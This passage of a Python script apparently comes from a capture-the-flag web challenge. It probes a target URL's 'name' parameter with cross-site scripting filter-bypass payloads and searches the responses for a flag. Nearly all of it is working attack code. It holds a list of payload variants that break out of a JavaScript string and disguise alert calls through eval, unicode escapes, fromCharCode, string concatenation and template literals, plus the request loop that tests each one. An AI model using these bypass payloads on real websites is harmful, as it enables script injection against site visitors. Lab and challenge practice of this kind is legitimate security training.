def examine_long_responses():
    """Examine the content of the longer responses to understand what's happening"""
    
    print(f"\n{'='*80}")
    print("EXAMINING LONG RESPONSES")
    print(f"{'='*80}")
    
    # Best performing payload so far
    best_payload = '";eval("alert(\"\\u0058\\u0053\\u0053\")");//'
    best_encoded = url_encode(best_payload)
    
    try:
        print("Testing best payload:")
        print(f"Raw: {best_payload}")
        print(f"URL: {target_url}?name={best_encoded}")
        
        url = f"{target_url}?name={best_encoded}"
        r = requests.get(url, timeout=10)
        text = r.text
        
        print(f"\nLength: {len(text)} (vs baseline 817)")
        
        # Look for XSS in response
        if "XSS" in text:
            print(f"[!] SUCCESS! XSS appears in response!")
            
            # Find all occurrences
            indices = [m.start() for m in re.finditer('XSS', text)]
            print(f"Found {len(indices)} occurrence(s) of 'XSS'")
            
            for idx in indices:
                snippet = text[max(0, idx-100):idx+50]
                print(f"\nOccurrence at position {idx}:")
                print(f"Context: ...{snippet}...")
            
            # Check entire page for flag or other interesting content
            if "FLAG{" in text:
                idx = text.find("FLAG{")
                flag = text[idx:idx+100]  # Get first 100 chars of flag
                print(f"\n[🏴‍☠️] FLAG POTENTIALLY FOUND: {flag[:50]}...")
            
            return True
        
        else:
            print("[-] No XSS in response")
            print("\nLooking for partial execution signs...")
            
            # Check for parts of payload
            indicators = {
                "eval": "eval() present",
                "fromCharCode": "fromCharCode present",
                "alert": "alert present",
                "unescape": "unescape present",
                "\\u": "Unicode escapes present",
                "%": "Percent encoding present"
            }
            
            for indicator, msg in indicators.items():
                if indicator in text:
                    print(f"[+] {msg}")
            
            # Show first 500 chars of response to see structure
            print(f"\nResponse preview:")
            print(text[:500])
    
    except Exception as e:
        print(f"Error: {e}")
    
    return False

def test_successful_variations():
    """Test variations of the successful (longer response) payloads"""
    
    print(f"\n{'='*80}")
    print("TESTING VARIATIONS OF SUCCESSFUL PAYLOADS")
    print(f"{'='*80}")
    
    variations = []
    
    # Based on the eval unicode success (1044 bytes)
    base_eval = ';eval("alert(\"\\u0058\\u0053\\u0053\")");'
    
    # Variation 1: Without outer quotes in eval
    var1 = '";eval(alert("XSS"));//'
    variations.append(("Direct eval alert", var1))
    
    # Variation 2: Multi-layer eval
    var2 = '";eval(eval("alert(\"\\u0058\\u0053\\u0053\")"));//'
    variations.append(("Double eval", var2))
    
    # Variation 3: String concatenation in eval
    var3 = '";eval("ale"+"rt(\"\\u0058\\u0053\\u0053\")");//'
    variations.append(("Eval string concat", var3))
    
    # Variation 4: FromCharCode inside eval
    var4 = '";eval("alert(String.fromCharCode(88,83,83))");//'
    variations.append(("Eval with fromCharCode", var4))
    
    # Variation 5: Template literal in eval
    var5 = '";eval("alert(`XSS`)");//'
    variations.append(("Eval with template", var5))
    
    # Variation 6: Unicode lowercase version
    var6 = '";alert("\u0078\u0073\u0073");//'  # lowercase xss in unicode
    variations.append(("Unicode lowercase", var6))
    
    # Variation 7: Mixed case unicode
    var7 = '";alert("\u0058\u0073\u0073");//'  # Xss
    variations.append(("Unicode mixed case", var7))
    
    success_count = 0
    
    for i, (desc, payload) in enumerate(variations, 1):
        print(f"\n[VAR {i:02d}] {desc}")
        print(f"Raw: {payload}")
        
        enc = url_encode(payload)
        url = f"{target_url}?name={enc}"
        
        print(f"URL: {url}")
        
        try:
            r = requests.get(url, timeout=10)
            text = r.text
            length = len(text)
            
            print(f"Length: {length}")
            
            if "XSS" in text:
                print(f"[!] SUCCESS! XSS executed!")
                success_count += 1
                
                # Show context
                idx = text.find("XSS")
                snippet = text[max(0, idx-100):idx+50]
                print(f"Context: ...{snippet}...")
            elif length > 1040:
                print(f"[+] Long response (>{length} bytes) but no XSS")
                # Check what's different
                if "eval" in text:
                    print(f"  - eval reflected")
                if "fromCharCode" in text:
                    print(f"  - fromCharCode reflected")
            else:
                print(f"[-] No XSS, normal length")
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print(f"\n{'='*80}")
    print(f"Variation results: {success_count} successful")
    print(f"{'='*80}")
    
    return success_count

# Run all tests
test_filter_mechanics()
examine_long_responses()
success = test_successful_variations()

if success > 0:
    print(f"\n[🎯] FOUND {success} WORKING PAYLOADS!")
else:
    print(f"\n[?] Close but not quite. The longer responses suggest partial bypass.")
